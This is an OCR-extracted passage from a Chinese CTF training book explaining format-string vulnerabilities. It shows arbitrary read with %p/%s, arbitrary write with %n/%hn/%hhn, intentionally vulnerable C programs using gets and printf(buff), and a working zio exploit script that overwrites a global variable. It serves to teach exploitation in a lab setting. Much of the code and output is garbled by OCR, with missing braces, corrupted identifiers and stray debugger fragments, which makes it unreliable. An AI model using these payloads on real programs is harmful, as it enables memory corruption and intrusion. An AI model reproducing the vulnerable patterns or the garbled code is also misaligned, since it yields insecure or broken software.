---
## Page 547
CTF特训营：技术详解、解题方法与
14.2信息泄蛋与修改
547/1144
4（"xp.xp.xp.xp.x....）
ormat
6x8
n+14>
calt
0x400410)
(1
edi,eax]
arg6-arg8..
rffffrfess
->0x7fffffffe7bb（*/tnp/fsb_test1_...)
e536(enin>:
push
rbp)
oxa3ce02ff131457bf
data,heap,rodata,vatue
FFfffffe558.ox7fffffffe568.（niL).8x7ffff7dd4e8o.ax7ffFf
图14-6x64程序函数栈状态
3.信息泄露的最基本技巧
无论是x86还是x64程序，后续参数都会存储在栈上，寻找参数
时，是往栈底（地址变大）方向去寻找，而栈底方向依次存放的是当
前函数、父函数及以上调用者的函数栈信息（参考第12章中的栈结
构信息），所以在泄露信息时，一般除了泄露栈中本身存储的数据之
外，还会在栈上布置一些数据来实现任意地址泄露。尤其是对于x64
---
## Page 548
CTF特训营：技术详解、解题方法与
14.2信息泄蛋与修改
548/1144
程序来说，寄存器的值不好控制，若想要实现任意地址泄露，则应更
倾向于控制栈数据。
示例代码如下：
#include 
char*global_str="showcontent";
int func_2()
char buff2[0x20];
memset(buff2,2',0x20);
/"%27$p.%28$p.%47$p
gets(buff2);
printf(buff2);
printf("n");
int func_1()
charbuff1[0x20];
memset（buff1,1',0x20);
memcpy(buff1,"x011x02lx03lx04lxe0lx86lx04lx08",8);
func_2();
int main()
charbuffo[0x20];
printf(%pln",global_str);
memset（buffo,0',0x20);
memcpy（buff0,“xeflxbelxad\xdelxffxffxfflxff,8);
func_1();
{
上述代码运行结果如图14-7所示。
0x80486e0
%27Sp.%28Sp.%47Sp
0x4030201.0x80486e0.0xdeadbeef
---
## Page 549
CTF特训营：技术详解、解题方法与
14.2信息泄雷与修改
549/1144
图14-7程序运行输出
在func2中的printf函数调用处下断点，查看相应的栈内存。为了
简化，这里只显示函数栈中buf数组变量相应的部分，栈对照图如图
14-8所示
可以看出，在func_2中调用printf函数时，本函数的buff2以及上
层函数里面的buff1和buf0都在栈中，且通过图14-8中所示的索引
“31、32、51”可以索引到前面设置的内存值，并将其显示出来。如
果使用了“%d$n”，则可以显示对应内存处的内容，如“%28$s”会
打印0x80486e0地址处的内容：如果能够控制这个值，则可以实现任
意地址访问。
11:0044
eax
("%315p.%32Sp.%51"...)
0052
ln"
dx-2
(22222)
buff2
7：
8:0072
("2222")
1:0124
ats 12tines>)
buff1
7:0148
("1111")
"11111111')
1:0204
4:0216
buffo
12tines>)
---
## Page 550
CTF特训营：技术详解、解题方法与
14.2信息泄雷与修改
550/1144
图14-8
printf函数处的栈状态
结果如图14-9所示。
0x80486e0
%28$S
show content
图14-9输入%28$s的程序输出情况
4.信息修改
信息修改主要是利用格式化字符串中的%n对参数进行写入，写
入的值是格式化字符串中%n之前的字符数量。
例如：
int val;
val=0:printf("12345%n"，&val);=>执行后val的值被修改成5
修改宽度控制具体如下。
%n：修改4字节。
%hn：修改2字节。
%hhn：修改1字节。
---
## Page 551
CTF特训营：技术详解、解题方法与
14.2信息泄雷与修改
551/1144
修改内容控制：结合%c来修改成特定的值，如将“%100c”替
换为宽度为100的字符，由于字符只有一个，其他部分由空格替代
示例说明如下。
对于int型数val，代码如下。
val =0;printf(%1991c%n",1',&val);=>val=1991
val =0;printf(%1991c%3$n",1,2,&val);=>val=1991
修改值时，如果宽度超过所规定的字节数，则其余部分（超出部
分）会被舍去，代码如下：
val=0:print(%16909060c%2$n",‘1',&val);=>val=16909060（0x01020304)
val=0;print(%16909060c%2Shn",*1',&val);=>val=772（0x0304）
val = 0;printf(%16909060c%2$hhn", *1', &val);=> val = 4(0x04)
修改时，如果修改的宽度没有超过原有的数据宽度，则其余部分
保持不变，代码如下：
val = 0x101;print("%16909060c%2$hhn",1,&val);=>val = 260(0x104)
下面列举一个示例，代码如下：
#include
---
## Page 552
CTF特训营：技术详解、解题方法与
14.2信息泄露与修改
552/1144
int global_sign =0;
int main()
A
char buff[0x20];
printf(%p\n", &global_sign);
gets(buff);
printf(buff);
printf("n");
if (global_sign == 1)
{
printf("Hacked\n");
else
{
printf(*Normaln");
在上述代码中，正常逻辑会打印出Normal，但是存在printf格式
化字符串漏洞，利用这个来实现任意地址写，改写全局变量
global_sign的值为1，从而改变正常逻辑，打印出Hacked
由于文中只有一个buff，所以将要改写内容的地址布置在buff
中，且格式化内容也在栈中。这样只要往后索引到所布置的地址，就
能对其进行改写了。利用代码如下：
from zio import *
target ="/fsb_modify_m32"
def get_io(target):
r_m=COLORED(RAW,"green")
W_m=COLORED（RAW,“blue”)
io = zio(target,timeout = 9999, print_read =r_m, print_write = w_m)
return io
---
## Page 553
CTF特训营：技术详解、解题方法与
14.2信息泄蛋与修改
553/1144
def pwn(io):
data = io.read_until("n")[:-1]
addr = int(data,16)
payload = "
#payload+="A"0x8
payload+="%1c%11$n"
payload=payload.ljust(0x10,a)
payload+=132(addr)
io.writeline(payload)
io.interact()
io =get_io（target)
(o)umd
执行结果如图14-10所示。
0x804a02c
%1c%11snaaaaaaaa,
aaaaaaaa
Hacked
图14-10劫持控制流成功
---
## Page 554
CTF特训营：技术详解、解题方法与
14.3额外技巧
554/1144
14.3额外技巧
关于格式化字符串漏洞的利用技巧，这里主要讲解如下三个方
面。
1.无法存放或索引到目的地址
无法存放或者索引到自的地址时，通过path二级指针进行格式化
利用。
这类情况通常又可分为以下3种。
1）由于可以控制的栈太小，例如只有几个字节，导致地址变量
无法存储到栈中。
2）可以控制的buff内存在堆上，无法索引到该地址
3）其他情况。
但是这类情况存在格式化字符串漏洞，并且可以多次执行，示例
代码如下：
#include
void init_proc()
{
---
## Page 555
CTF特训营：技术详解、解题方法与
14.3额外技巧
555/1144
setvbuf（stdin,0,2,0);
setvbuf(stdout,0, 2,0）
setvbuf(stderr,0,2,0);
voidget_buff（char*buff,intsize,char end_ch)
int i;
chartmp_ch;
for (i=0;i>");
get_buff(buff，16,n);
if （memcmp（buff,“exit”，4）==0)
break;
printf(buff);
putchar(n');
反汇编代码如图14-11所示。
在格式化字符串漏洞0x4009B5处下断点，观察栈内存如图14-12
---
## Page 556
CTF特训营：技术详解、解题方法与
14.3额外技巧
556/1144
所示。
可以看到，如果单用buf是不能修改任意地址内存的，所以需要
多级指针来配合。从图14-13中可以看出，存在多个位置可以利用
一般建议利用path多级指针。path指针修改示意如图14-13所示。
.text:0000000000400977
RoU
esi,offset aExit ;"exit”
.text:000000000040097C
RoU
rdi,rax
.text:000000000040097F
ca11
_nencnp
:51
.text:0000000000400986
text:0000000000400984
test
short 1oc_40099A
eax,eax
jnz
.text:0000000000400988
nop
.text:0000000000400989
ROU
rcx,[rbp+uar_8]
.text:0000000000400980
xor
rcx, fs:28h
.text:0000000000400996
jz
short locret_4ee9cB
.text:000000000040099A
.text:0000000000400998
jnp
short 1oc_4ea9c6
.text:000000000040099A 10c_40099A:
.text:000000000040099A
;CoDE xREF: nain+5ETj
.text:000000000040099A
noU
edi,offset asc_400a63;":
edi,eax)
064
多级指针
push
rbp)
3:8184
ebp,ebp)
x8
x
xb77
x8
---
## Page 557
CTF特训营：技术详解、解题方法与